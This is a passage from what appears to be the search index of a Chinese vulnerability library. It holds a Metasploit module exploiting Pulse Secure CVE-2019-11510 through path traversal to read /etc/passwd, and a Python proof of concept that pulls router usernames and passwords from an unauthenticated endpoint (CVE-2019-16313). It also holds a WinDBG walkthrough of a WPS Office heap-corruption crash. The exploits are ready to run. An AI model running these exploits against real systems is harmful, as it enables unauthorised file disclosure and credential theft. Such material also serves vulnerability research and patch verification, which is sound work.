9.0 before 9.0R3.4\n# Tested on: Linux\n# CVE : CVE-2019-11510 \nrequire 'msf/core'\nclass MetasploitModule &lt; Msf::Auxiliary\n    include Msf::Exploit::Remote::HttpClient\n    include Msf::Post::File\n    def initialize(info = {})\n        super(update_info(info,\n            'Name'           =&gt; 'Pulse Secure - System file leak',\n            'Description'    =&gt; %q{\n                Pulse Secure SSL VPN file disclosure via specially crafted HTTP resource requests.\n        This exploit reads /etc/passwd as a proof of concept\n        This vulnerability affect ( 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4\n            },\n            'References'     =&gt;\n                [\n                    [ 'URL', 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510' ]\n                ],\n            'Author'         =&gt; [ '0xDezzy (Justin Wagner), Alyssa Herrera' ],\n            'License'        =&gt; MSF_LICENSE,\n             'DefaultOptions' =&gt;\n              {\n                'RPORT' =&gt; 443,\n                'SSL' =&gt; true\n              },\n            ))\n\n    end\n\n\n    def run()\n        print_good(\"Checking target...\")\n        res = send_request_raw({'uri'=&gt;'/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'},1342)\n\n        if res &amp;&amp; res.code == 200\n            print_good(\"Target is Vulnerable!\")\n            data = res.body\n            current_host = datastore['RHOST']\n            filename = \"msf_sslwebsession_\"+current_host+\".bin\"\n            File.delete(filename) if File.exist?(filename)\n            file_local_write(filename, data)\n            print_good(\"Parsing file.......\")\n            parse()\n        else\n            if(res &amp;&amp; res.code == 404)\n                print_error(\"Target not Vulnerable\")\n            else\n                print_error(\"Ooof, try again...\")\n            end\n        end\n    end\n    def parse()\n        current_host = datastore['RHOST']\n\n        fileObj = File.new(\"msf_sslwebsession_\"+current_host+\".bin\", \"r\")\n        words = 0\n        while (line = fileObj.gets)\n            printable_data = line.gsub(/[^[:print:]]/, '.')\n            array_data = printable_data.scan(/.{1,60}/m)\n            for ar in array_data\n                if ar != \"............................................................\"\n                    print_good(ar)\n                end\n            end\n            #print_good(printable_data)\n\n        end\n        fileObj.close\n    end\nend\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%84%89%E5%86%B2%E5%AE%89%E5%85%A8/CVE-2019-11510/#_2","title":"\u53c2\u8003\u94fe\u63a5\uff1a","text":"<p>https://github.com/jas502n/CVE-2019-11510-1 </p> <p>https://hackerone.com/reports/591295 </p> <p>https://github.com/projectzeroindia/CVE-2019-11510 </p> <p>https://www.anquanke.com/vul/id/1589103 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","title":"CVE 2019 16313 \u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31\u5bc6\u7801\u6cc4\u9732\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_1","title":"\u524d\u8a00","text":"<p>\u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31\u5bc6\u7801\u6cc4\u9732\u6f0f\u6d1e</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>\u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31\u5bc6\u7801\u6cc4\u9732\u6f0f\u6d1e,\u5bc6\u7801<code>hash</code>\u76f4\u63a5\u5b58\u653e\u5728\u7f51\u9875\u6e90\u7801\u91cc</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u5371\u5bb3","text":"<p>\u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31\u5bc6\u7801\u6cc4\u9732,\u53ef\u76f4\u63a5\u63a5\u7ba1\u8def\u7531\u5668</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_4","title":"\u5f71\u54cd\u8303\u56f4","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_5","title":"\u4ea7\u54c1","text":"<p>\u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_6","title":"\u7248\u672c","text":"<p>\u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_7","title":"\u7ec4\u4ef6","text":"<p>\u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_8","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u8bbf\u95ee/index.htm?PAGE=web\u94fe\u63a5\uff0c\u6b64\u94fe\u63a5\u672a\u6388\u6743\u8bbf\u95ee\uff08\u91cc\u9762\u7684\u64cd\u4f5c\u9700\u8981\u8ba4\u8bc1\uff09\uff1a</p> <p>\u9009\u62e9`web\u8d26\u53f7\u7ba1\u7406\uff1a \u67e5\u770b\u6e90\u4ee3\u7801\u5373\u53ef\u83b7\u53d6\u5230\u767b\u5f55\u5bc6\u7801\u7684\u54c8\u5e0c\u503c\uff1a</p> <p>\u89e3\u5bc6\u54c8\u5e0c\u5373\u53ef\u83b7\u5f97\u5bc6\u7801\uff1a</p> <p>/login.html\u4ece\u6b64\u94fe\u63a5\u767b\u5f55\u7cfb\u7edf\uff1a</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#poc","title":"POC","text":"<pre><code>from optparse import OptionParser\nimport requests\nimport json\n\ndef getpass(target):\n    r = requests.get( target + '/action/usermanager.htm')\n    #return r.text\n    s=json.loads(r.text)\n    s=str(s['rows'])\n    s=s.replace(\"[\",\"\")\n    s=s.replace(\"]\",\"\")\n    s=s.replace(\"\\'\",\"\\\"\")\n    s2=json.loads(s)\n    print(\"\u8d26\u53f7:\"+s2['user']+\"\uff0c\u5bc6\u7801:\"+s2['pwd']+\"\\n\u767b\u5f55\u5730\u5740\u4e3a:\"+target+\"/login.html\")\n\ndef main():\n    usage = \"usage: python3 %prog -t \u76ee\u6807(\u683c\u5f0f\uff1ahttp://1.1.1.1)\"\n    parser = OptionParser(usage=usage)\n    parser.add_option('-t', dest='target',type='string',help='\u76ee\u6807ip')\n    (options, args) = parser.parse_args()\n    target = options.target\n    if target:\n        getpass(target)\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1WPS%20Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"\u91d1\u5c71WPS Office\u8fdc\u7a0b\u5806\u635f\u574f\u6f0f\u6d1e\u5bfc\u81f4\u4ee3\u7801\u6267\u884c","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1WPS%20Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","title":"\u603b\u89c8","text":"<p>WPS Office\u662f\u7531Microsoft\u73e0\u6d77\u7684\u4e2d\u56fd\u8f6f\u4ef6\u5f00\u53d1\u5546\u91d1\u5c71\u8f6f\u4ef6\u5f00\u53d1\u7684\u529e\u516c\u5957\u4ef6\uff0c\u9002\u7528\u4e8eMicrosoft Windows\uff0cmacOS\uff0cLinux\uff0ciOS\u548cAndroid\u3002WPS Office\u7531\u4e09\u4e2a\u4e3b\u8981\u7ec4\u4ef6\u7ec4\u6210\uff1aWPS Writer\uff0cWPS Presentation\u548cWPS Spreadsheet\u3002\u4e2a\u4eba\u57fa\u672c\u7248\u672c\u53ef\u4ee5\u514d\u8d39\u4f7f\u7528\u3002WPS Office\u8f6f\u4ef6\u4e2d\u5b58\u5728\u4e00\u4e2a\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff0c\u662f\u5f53Office\u8f6f\u4ef6\u5728\u5206\u6790\u7279\u5236Office\u6587\u4ef6\u65f6\u4e0d\u6b63\u786e\u5730\u5904\u7406\u5185\u5b58\u4e2d\u7684\u5bf9\u8c61\u65f6\u5f15\u8d77\u7684\u3002\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5f53\u524d\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u4efb\u610f\u4ee3\u7801\u3002\u6545\u969c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u3002\u6f0f\u6d1e\u4ea7\u54c1WPS Office\uff0c\u5f71\u54cd\u7248\u672c11.2.0.9453\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1WPS%20Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_2","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>\u5728WPS Office\u4e2d\u7528\u4e8e\u56fe\u50cf\u683c\u5f0f\u89e3\u6790\u7684Qt\u6a21\u5757\u4e2d\u53d1\u73b0\u5806\u635f\u574f\u3002\u5d4c\u5165WPS office\u7684\u7279\u5236\u56fe\u50cf\u6587\u4ef6\u53ef\u80fd\u4f1a\u89e6\u53d1\u6b64\u6f0f\u6d1e\u3002\u6253\u5f00\u7279\u5236\u7684\u6587\u6863\u6587\u4ef6\u65f6\uff0c\u89e6\u53d1\u8bbf\u95ee\u51b2\u7a81\u3002EDX\u6307\u5411\u6570\u7ec4\u7684\u6307\u9488\uff0c\u800cEAX\u662f\u6307\u5411\u6570\u7ec4\u7684\u7d22\u5f15\u3002<code>0:000&gt; g (c50.b4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=000000c0 ebx=006f1c48 ecx=cd2aefbc edx=cd2c6f80 esi=2ed7ae18 edi=0000001c eip=6ba13321 esp=006f1b44 ebp=006f1b44 iopl=0         nv up ei pl nz na po nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202 QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210        mov     eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290=????????</code>\u5d29\u6e83\u662f\u5982\u4f55\u89e6\u53d1\u7684\uff1f\u8ba9\u6211\u4eec\u770b\u4e00\u4e0bPNG\u6807\u5934\u683c\u5f0f\u3002<code>00029E30  FF 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44  \u00ff\u2030PNG........IHD 00029E40  52 00 00 02 80 00 00 01 C6 04 03 00 00 00 16 0A  R...\u20ac...\u00c6....... 00029E50  27 FC 00 00 00 04 67 41 4D 41 00 00 B1 88 95 98  '\u00fc....gAMA..\u00b1\u02c6\u2022\u02dc 00029E60  F4 A6 00 00 00 30 50 4C 54 45 00 00 00 80 00 00  \u00f4\u00a6...0PLTE...\u20ac.. 00029E70  00 80 00 80 80 00 00 00 80 80 00 80 00 80 80 80  .\u20ac.\u20ac\u20ac...\u20ac\u20ac.\u20ac.\u20ac\u20ac\u20ac 00029E80  80 80 C0 C0 C0 FF 00 00 00 FF 00 FF FF 00 00 00  \u20ac\u20ac\u00c0\u00c0\u00c0\u00ff...\u00ff.\u00ff\u00ff... 00029E90  FF FF 00 FF 00 FF FF FF FF FF 7B 1F B1 C4 00 00  \u00ff\u00ff.\u00ff.\u00ff\u00ff\u00ff\u00ff\u00ff{.\u00b1\u00c4..</code>\u4ece\u504f\u79fb\u91cf0x29E31\u5f00\u59cb-0x29E34\u662fPNG\u6587\u4ef6\u683c\u5f0f\u7684\u7b7e\u540d\u6807\u5934\u3002PNG\u5934\u6587\u4ef6\u7684\u7ed3\u6784\uff1a<code>PNG signature --&gt; IHDR --&gt; gAMA --&gt; PLTE --&gt; pHYs --&gt; IDAT --&gt; IEND</code>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5f53WPS Office Suite\u4e2d\u4f7f\u7528\u7684QtCore\u5e93\u89e3\u6790PLTE\u7ed3\u6784\u5e76\u89e6\u53d1\u5806\u7834\u574f\u65f6\uff0c\u8be5\u6f0f\u6d1e\u4f4d\u4e8eWord\u6587\u6863\u4e2d\u7684\u5d4c\u5165\u5f0fPNG\u6587\u4ef6\u4e2d\u3002\u5728\u504f\u79fb\u91cf0x29E82\u52300x29E85\u5904\uff0c\u8c03\u8272\u677f\u7684\u89e3\u6790\u5931\u8d25\uff0c\u4ece\u800c\u89e6\u53d1\u4e86\u5806\u4e2d\u7684\u5185\u5b58\u635f\u574f\u3002\u5d29\u6e83\u89e6\u53d1\u4e4b\u524d\u7684\u5806\u6808\u8ddf\u8e2a\uff1a<code>00 00ee1790 6b8143ef QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a71 01 00ee17f0 6b814259 QtCore4!QBrush::setMatrix+0x234 02 00ee58d4 6b8249a4 QtCore4!QBrush::setMatrix+0x9e 03 00ee58ec 6b80cc84 QtCore4!QImage::rect+0x22b 04 00ee5908 6b857ccc QtCore4!QTransform::inverted+0xec8 05 00ee629c 6b81c55b QtCore4!QSvgFillStyle::setFillOpacity+0x1b59 06 00ee6480 6b896844 QtCore4!QPainter::drawPixmap+0x1c98 07 00ee6574 6d1e0fbd QtCore4!QPainter::drawImage+0x325 08 00ee6594 6d0dd155 kso!GdiDrawHoriLineIAlt+0x11a1a</code>\u5728QtCore4\u89e3\u6790\u5d4c\u5165\u5f0f\u56fe\u50cf\u4e4b\u524d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6765\u81eaKSO\u6a21\u5757\u7684\u6700\u540e\u4e00\u6b21\u8c03\u7528\uff0c\u8bd5\u56fe\u5904\u7406\u56fe\u50cfkso\uff01GdiDrawHoriLineIAlt\u3002\u4f7f\u7528IDA Pro\u5206\u89e3\u5e94\u7528\u7a0b\u5e8f\u6765\u5206\u6790\u53d1\u751f\u5f02\u5e38\u7684\u529f\u80fd\u3002\u6700\u540e\u7684\u5d29\u6e83\u8def\u5f84\u5982\u4e0b\uff08WinDBG\u7ed3\u679c\uff09\uff1a<code>QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210        mov     eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290=????????</code>\u5728IDA Pro\u4e2d\u6253\u5f00\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u6309\u4ee5\u4e0b\u65b9\u5f0f\u53cd\u6c47\u7f16\u8be5\u51fd\u6570\uff1a<code>.text:67353315                 push    ebp .text:67353316                 mov     ebp, esp .text:67353318                 movzx   eax, byte ptr [ecx+edx]  ; crash here .text:6735331C                 mov     ecx, [ebp+arg_0] .text:6735331F                 mov     edx, [ecx] .text:67353321                 mov     eax, [edx+eax*4+10h] .text:67353325                 mov     ecx, eax</code>\u4f7f\u7528\u6545\u969c\u8f6c\u50a8\u4e2d\u7684\u4fe1\u606f\uff0c\u6211\u4eec\u77e5\u9053\u5e94\u7528\u7a0b\u5e8f\u5728<code>0x67353321\uff08\u79fb\u52a8eax\uff0c[edx + eax * 4 + 10h]\uff09</code>\u5904\u89e6\u53d1\u4e86\u8bbf\u95ee\u51b2\u7a81\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230EAX\u5bc4\u5b58\u5668\u75310xc0\u503c\u63a7\u5236\u3002\u56e0\u6b64\uff0c\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u5bfc\u81f4\u5f02\u5e38\u7684\u6307\u4ee4\u5bf9\u5bc4\u5b58\u5668\u7684\u72b6\u6001\u8fdb\u884c\u4e00\u4e9b\u5047\u8bbe\u3002\u9700\u8981\u6ce8\u610f\u7684\u91cd\u8981\u4e00\u70b9\u662f\uff0c\u5728\u53d1\u751f\u5f02\u5e38\u4e4b\u524d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230ECX\uff080xc0\uff09\u4e2d\u5305\u542b\u7684\u503c\u6b63\u5728\u5199\u5165\u5230\u4ee5\u4e0b\u6307\u4ee4\u6240\u5b9a\u4e49\u7684\u4efb\u610f\u4f4d\u7f6e\uff1a<code>mov     ecx, [ebp+arg_0]</code>\u6b64\u5916\uff0c\u6211\u4eec\u6ce8\u610f\u5230\uff0c\u5728\u6211\u4eec\u7684\u6545\u969c\u6307\u4ee4\u4e4b\u5916\uff0cEBP\u7684\u504f\u79fb\u91cf\u5b58\u50a8\u5728ECX\u5bc4\u5b58\u5668\u4e2d\u3002\u6211\u4eec\u5728\u524d\u9762\u63d0\u5230\u7684\u6307\u4ee4\uff08\u504f\u79fb\u91cf\u4e3a0x6ba1331c\uff09\u4e0a\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u65ad\u70b9\uff0c\u4ee5\u89c2\u5bdf\u5185\u5b58\u3002\u65ad\u70b9\u89e6\u53d1\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7b2c\u4e00\u4e2a\u503cc45adfbc\u5f15\u7528\u4e86\u53e6\u4e00\u4e2a\u6307\u9488\uff0c\u8be5\u6307\u9488\u5e94\u8be5\u662f\u6307\u5411\u6570\u7ec4\u7684\u6307\u9488\u3002``` Breakpoint 0 hit eax=0000000f ebx=004f1b40 ecx=d3544100 edx=0000001c esi=d1200e18 edi=0000001c eip=6ba1331c esp=004f1a34 ebp=004f1a34 iopl=0         nv up ei pl nz na po nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202 QtCore4!QMatrix::dy+0x48a3: 6ba1331c 8b4d08          mov     ecx,dword ptr [ebp+8] ss:002b:004f1a3c=c45adfbc</p> <p>0:000&gt; dc ebp+8 004f1a3c  c45adfbc 00000048 00000000 6f13830f  ..Z.H..........o 004f1a4c  004f5cc8 00000000 00000000 00000000  .\\O............. 004f1a5c  00000000 004f65a0 004f662c 00000000  .....eO.,fO..... 004f1a6c  779eae8e 00000000 00000001 3f800000  ...w...........? 004f1a7c  3f800000 3f31e4f8 3f800000 3f800000  ...?..1?...?...? 004f1a8c  3f800000 3f31e4f8 3f800000 3de38800  ...?..1?...?...= 004f1a9c  3de38800 3d9e1c8a 3c834080 004f3c00  ...=...=.@.&lt;.&lt;O. 004f1aac  4101c71c 6ba13315 3f800000 4081c71c  ...A.3.k...?...@  <code>\u4ecec45adfbc\u89c2\u5bdf\u5185\u5b58\u5f15\u7528\uff0c\u53d1\u73b0\u53e6\u4e00\u4e2a\u6307\u9488\u3002\u7b2c\u4e00\u4e2a\u503cab69cf80\u59cb\u7ec8\u8868\u793a\u4e3a\u6307\u5411\u5b83\u6240\u5f15\u7528\u7684\u4efb\u4f55\u5730\u65b9\u7684\u6307\u9488\u3002\u6307\u9488ab69cf80\u57fa\u672c\u4e0a\u662f\u6211\u4eec\u6307\u9488\u7684\u7d22\u5f15\u6570\u7ec4\u3002 0:000&gt; dc c45adfbc</code> c45adfbc  ab69cf80 d3544100 00000003 00000280  ..i..AT......... c45adfcc  0000055a 00000012 c0c0c0c0 1c3870e2  Z............p8. c45adfdc  40ad870e 1c3870e2 40ad870e 00000000  ...@.p8....@.... c45adfec  00000000 c0c0c0c1 6c1d12c0 00000000  ...........l.... c45adffc  c0c0c0c0 ???????? ???????? ????????  ....???????????? c45ae00c  ???????? ???????? ???????? ????????  ???????????????? c45ae01c  ???????? ???????? ???????? ????????  ???????????????? c45ae02c  ???????? ???????? ???????? ????????  ????????????????</p> <p>0:000&gt; dc ab69cf80 ab69cf80  00000001 0000001c 00000010 00000001  ................ // 0000001c is overwritten in the register EDX and EDI before we trigger crash ab69cf90  ff000000 ff800000 ff008000 ff808000  ................  ab69cfa0  ff000080 ff800080 ff008080 ff808080  ................ ab69cfb0  ffc0c0c0 ffff0000 ff00ff00 ffffff00  ................ // ffc0c0c0 where it will be stored in EAX after crash, at the moment it only takes 0xf value in EAX ab69cfc0  ff0000ff ffff00ff ff00ffff ffffffff  ................ ab69cfd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................ ab69cfe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................ ab69cff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................  <code>\u56e0\u4e3a\u6211\u4eec\u77e5\u9053\u5d29\u6e83\u7684\u8def\u5f84\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u7b80\u5355\u5730\u8bbe\u7f6e\u4e00\u4e2a\u65ad\u70b9\u3002\u8be5\u547d\u4ee4\u5c06\u83b7\u5f97\u6307\u9488\u503c\u201c edx + eax \\* 4 + 10\u201d\uff0c\u5e76\u68c0\u67e5\u5176\u662f\u5426\u6ee1\u8db30xc0\u3002</code> bp 6ba13321 \".if (poi(edx+eax*4+10) == 0xc0) {} .else {gc}\"</p> <p>0:000&gt; g eax=000000c0 ebx=004f1b40 ecx=c45adfbc edx=ab69cf80 esi=d1200e18 edi=0000001c eip=6ba13321 esp=004f1a34 ebp=004f1a34 iopl=0         nv up ei pl nz na po nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202 QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210        mov     eax,dword ptr [edx+eax*4+10h] ds:002b:ab69d290=????????  <code>\u5982\u679c\u89c2\u5bdf\u5806\u6808\uff0c\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u6267\u884c\uff1a</code> 004f1a38 6ba3cb98 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74 004f1a3c c45adfbc  004f1a40 00000048  004f1a44 00000000  004f1a48 6f13830f verifier!DphCommitMemoryForPageHeap+0x16f 004f1a4c 004f5cc8  004f1a50 00000000  004f1a54 00000000  004f1a58 00000000  004f1a5c 00000000  004f1a60 004f65a0  004f1a64 004f662c  004f1a68 00000000  004f1a6c 779eae8e ntdll!RtlAllocateHeap+0x3e  <code>\u5982\u679c\u6211\u4eec\u53cd\u6c47\u7f166ba3cb98\uff0c\u5219\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u53cd\u6c47\u7f16\u4ee3\u7801\u3002\u771f\u6b63\u7684\u6839\u672c\u539f\u56e0\u5728\u4e8e\u6b64\u4ee3\u7801\u3002</code> 6ba3cb89 8b96b4000000    mov     edx,dword ptr [esi+0B4h] 6ba3cb8f 8b4df4          mov     ecx,dword ptr [ebp-0Ch] 6ba3cb92 52              push    edx 6ba3cb93 8bd7            mov     edx,edi 6ba3cb95 ff5580          call    dword ptr [ebp-80h] 6ba3cb98 8b4e7c          mov     ecx,dword ptr [esi+7Ch]</p> <p>C pseudo code</p> <p>grad = *(&amp;ptr_grad); if ( grad &gt; 0.0099999998 ) {    input_value = grad_size(check, size, input);    ptr_grad = *(input);    ... cut here ...  <code>\u6211\u4eec\u57286ba3cb89\u5730\u5740\u4e0a\u8bbe\u7f6e\u65ad\u70b9\uff0c\u5e76\u89c2\u5bdfESI + 0xB4\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u6307\u9488\u6307\u5411\u53e6\u4e00\u4e2a\u4f4d\u7f6e\uff1a</code> 0:000&gt; r eax=00000000 ebx=00791878 ecx=00000005 edx=00793938 esi=cb07de18 edi=0000001c eip=6ba3cb89 esp=00791780 ebp=00791870 iopl=0         nv up ei pl nz na po nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a65: 6ba3cb89 8b96b4000000    mov     edx,dword ptr [esi+0B4h] ds:002b:cb07decc=cf69afbc</p> <p>0:000&gt; dc esi+0B4h cb07decc  cf69afbc c0c0c000 00000000 00000100  ..i............. cb07dedc  c0c0c0c0 00000000 00000000 00000000  ................ cb07deec  00000000 00000000 00000000 00000000  ................ cb07defc  00000000 cf030fd0 00000000 00000000  ................ cb07df0c  00000000 00000000 00000000 00000000  ................ cb07df1c  c0c0c0c0 00000000 3ff00000 00000000  ...........?.... cb07df2c  00000000 00000000 00000000 00000000  ................ cb07df3c  00000000 00000000 3ff00000 00000000  ...........?....</p> <p>0:000&gt; dc cf69afbc cf69afbc  c88baf80 d1326100 00000003 00000280  .....a2......... cf69afcc  0000055f 00000012 c0c0c0c0 1c3870e2  _............p8. cf69afdc  40ad870e 1c3870e2 40ad870e 00000000  ...@.p8....@.... cf69afec  00000000 c0c0c0c1 6c1d12c0 00000000  ...........l.... cf69affc  c0c0c0c0 ???????? ???????? ????????  ....???????????? cf69b00c  ???????? ???????? 